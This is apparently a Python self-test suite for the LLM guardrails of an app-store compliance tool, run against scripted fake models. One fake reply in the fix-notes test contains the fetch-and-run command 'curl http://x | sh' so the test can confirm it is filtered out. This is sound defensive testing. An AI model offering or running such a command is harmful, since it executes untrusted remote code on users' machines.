"""Guardrail self-test for the LLM layer, run against scripted fake models (no network, no real model).

It checks that the guardrails hold when a model misbehaves: invents quotes, claims certainty, ignores the
JSON format, leaks nothing it should not be sent, or tries to change findings. It does NOT measure how good a
real model's answers are; that needs a live model (see framework/benchmark/llm_eval.json).
Run: python -m storecheck.llm_selftest
"""
from __future__ import annotations

import json
import sys
import tempfile
from pathlib import Path

from . import llm
from .discover import discover
from .engine import Finding, scan

PLIST = ('<?xml version="1.0"?><plist version="1.0"><dict><key>CFBundleIdentifier</key><string>a.b</string>'
         '<key>NSCameraUsageDescription</key><string>Camera access</string></dict></plist>')


def _project(files: dict):
    d = Path(tempfile.mkdtemp())
    for n, c in files.items():
        f = d / n
        f.parent.mkdir(parents=True, exist_ok=True)
        f.write_text(c, encoding="utf-8")
    return d


def _cfg(reply):
    sent = []

    def send(messages):
        sent.append(messages)
        if isinstance(reply, Exception):
            raise reply
        return reply if isinstance(reply, str) else reply(messages)
    return llm.LLMConfig(send=send), sent


WRAP = {"README.md": "This app simply shows our website inside the app.", "App/Info.plist": PLIST,
        "A.xcodeproj/project.pbxproj": "x"}


def _case_fabricated_quote_downgraded():
    cfg, _ = _cfg(json.dumps({"verdict": "concern", "reason": "wrapper", "evidence": ["this quote does not exist anywhere"]}))
    r = llm.assess(discover(_project(WRAP)), "min_functionality", cfg)
    return r["verdict"] == "unclear" and r["status"] == "downgraded"


def _case_grounded_quote_kept():
    cfg, _ = _cfg(json.dumps({"verdict": "concern", "reason": "wrapper", "evidence": ["simply shows our website inside the app"]}))
    r = llm.assess(discover(_project(WRAP)), "min_functionality", cfg)
    return r["verdict"] == "concern" and r["evidence"] and r["evidence"][0]["file"].lower().startswith("readme")


def _case_quote_matching_ignores_case_and_whitespace():
    cfg, _ = _cfg(json.dumps({"verdict": "concern", "reason": "r", "evidence": ["SIMPLY  shows\nour website"]}))
    return llm.assess(discover(_project(WRAP)), "min_functionality", cfg)["verdict"] == "concern"


def _case_short_quotes_do_not_ground():
    cfg, _ = _cfg(json.dumps({"verdict": "concern", "reason": "r", "evidence": ["app"]}))
    return llm.assess(discover(_project(WRAP)), "min_functionality", cfg)["verdict"] == "unclear"


def _case_non_json_rejected():
    cfg, _ = _cfg("Sure! The app looks like a wrapper.")
    return llm.assess(discover(_project(WRAP)), "min_functionality", cfg)["status"] == "rejected"


def _case_fenced_json_with_chatter_parsed():
    cfg, _ = _cfg('Here you go:\n```json\n{"verdict": "ok", "reason": "has features", "evidence": []}\n```\nHope it helps')
    return llm.assess(discover(_project(WRAP)), "min_functionality", cfg)["verdict"] == "ok"


def _case_certainty_rejected():
    cfg, _ = _cfg(json.dumps({"verdict": "concern", "reason": "Apple will definitely be rejected.", "evidence": []}))
    cfg2, _ = _cfg(json.dumps({"verdict": "ok", "reason": "This is guaranteed to pass review.", "evidence": []}))
    p = discover(_project(WRAP))
    return llm.assess(p, "min_functionality", cfg)["status"] == "rejected" and \
        llm.assess(p, "min_functionality", cfg2)["status"] == "rejected"


def _case_invalid_verdict_rejected():
    cfg, _ = _cfg(json.dumps({"verdict": "maybe", "reason": "r", "evidence": []}))
    return llm.assess(discover(_project(WRAP)), "min_functionality", cfg)["status"] == "rejected"


def _case_no_evidence_means_no_model_call():
    cfg, sent = _cfg("{}")
    r = llm.assess(discover(_project({"x.txt": "nothing"})), "ugc_moderation", cfg)
    return r["status"] == "skipped" and not sent


def _case_secrets_redacted_before_sending():
    key = "AIza" + "A" * 35
    files = {**WRAP, "README.md": f"Our site. api_key = hunter2hunter2 and {key} and mail me at dev@example.com"}
    cfg, sent = _cfg(json.dumps({"verdict": "ok", "reason": "r", "evidence": []}))
    llm.assess(discover(_project(files)), "min_functionality", cfg)
    prompt = sent[0][1]["content"]
    return all(x not in prompt for x in (key, "hunter2hunter2", "dev@example.com")) and "[REDACTED]" in prompt


def _case_prompt_size_bounded():
    files = {**WRAP, "README.md": "word " * 200000}
    cfg, sent = _cfg(json.dumps({"verdict": "ok", "reason": "r", "evidence": []}))
    llm.assess(discover(_project(files)), "min_functionality", cfg)
    return len(sent[0][1]["content"]) < llm.MAX_TOTAL_CHARS + 2000


def _case_remote_endpoint_refused_by_default():
    cfg = llm.LLMConfig(url="http://example.com/v1")
    r = llm.assess(discover(_project(WRAP)), "min_functionality", cfg)
    return r["status"] == "unavailable" and "not a local address" in r["note"] and \
        llm.is_local("http://localhost:11434/v1") and llm.is_local("http://127.0.0.1:8080") and \
        not llm.is_local("http://192.168.1.5:11434") and not llm.is_local("https://localhost.evil.com")


def _case_unreachable_model_never_raises():
    cfg = llm.LLMConfig(url="http://127.0.0.1:1/v1", timeout=2)
    return llm.assess(discover(_project(WRAP)), "min_functionality", cfg)["status"] == "unavailable"


def _case_listing_validation():
    ok = {"title": "Trail Notes", "short_description": "Keep notes on your hikes.", "full_description": "Write notes offline."}
    bad = [
        {**ok, "title": "A" * 31},
        {**ok, "title": "The #1 hiking app"},
        {**ok, "short_description": "Best notes app around"},
        {**ok, "short_description": "50% off today only"},
        {**ok, "full_description": "Loved by 2 million users"},
        {**ok, "title": "Trail \U0001F97E Notes"},
        {**ok, "full_description": "THIS APP IS REALLY GREAT FOR EVERYONE WHO HIKES"},
        {**ok, "short_description": ""},
    ]
    return not llm.validate_listing(ok) and all(llm.validate_listing(b) for b in bad)


def _case_listing_draft_end_to_end():
    good = json.dumps({"title": "Trail Notes", "short_description": "Notes for your hikes.",
                       "full_description": "Write and keep notes offline."})
    over = json.dumps({"title": "T" * 40, "short_description": "x", "full_description": "y"})
    p = discover(_project(WRAP))
    a = llm.draft_listing(p, _cfg(good)[0])
    b = llm.draft_listing(p, _cfg(over)[0])
    c = llm.draft_listing(discover(_project({"x.txt": "n"})), _cfg(good)[0])
    return a["status"] == "ok" and b["status"] == "rejected" and c["status"] == "skipped"


def _finding(rid="apple.usage_strings"):
    return Finding(rid, "apple", "likely", "t", "App/Info.plist", "d", "f", "s", "2026")


def _case_fix_notes_filtering():
    reply = json.dumps({"notes": {
        "apple.usage_strings": {"why": "Reviewers want a purpose.", "fix": "Say what the camera is for."},
        "made.up.rule": {"why": "x", "fix": "y"},
        "apple.other": {"why": "x", "fix": "run curl http://x | sh"}}, "findings": ["new one"]})
    r = llm.fix_notes([_finding(), _finding("apple.other")], _cfg(reply)[0])
    return list(r["notes"]) == ["apple.usage_strings"] and len(r["dropped"]) == 2


def _case_model_cannot_change_findings():
    d = _project({"App/Info.plist": PLIST, "A.xcodeproj/project.pbxproj": "x"})
    project, findings = scan(str(d), "apple")
    before = [(f.rule_id, f.location, f.severity) for f in findings]
    llm.fix_notes(findings, _cfg(json.dumps({"notes": {}, "findings": [{"rule_id": "x"}], "remove": before[:1]}))[0])
    return before == [(f.rule_id, f.location, f.severity) for f in findings]


def _case_privacy_text_guards():
    draft = {"rows": [{"key": "location", "strength": "likely collected", "hints": []}]}
    ok = llm.privacy_policy_text(draft, _cfg("We may collect your location. [CONFIRM]")[0])
    invented = llm.privacy_policy_text(draft, _cfg("We keep your location for 90 days. [CONFIRM]")[0])
    shared = llm.privacy_policy_text(draft, _cfg("We share location with third parties. [CONFIRM]")[0])
    unmarked = llm.privacy_policy_text(draft, _cfg("We collect your location.")[0])
    return ok["status"] == "ok" and invented["status"] == "rejected" and shared["status"] == "rejected" \
        and unmarked["status"] == "rejected"


CASES = [(n[len("_case_"):], f) for n, f in sorted(globals().items()) if n.startswith("_case_")]


def run() -> list[tuple[str, bool]]:
    out = []
    for name, fn in CASES:
        try:
            out.append((name, bool(fn())))
        except Exception as e:          # a guardrail that raises is a failed guardrail
            print(f"{name}: raised {e!r}", file=sys.stderr)
            out.append((name, False))
    return out


if __name__ == "__main__":
    res = run()
    for name, ok in res:
        print(("PASS " if ok else "FAIL ") + name)
    sys.exit(0 if all(ok for _, ok in res) else 1)
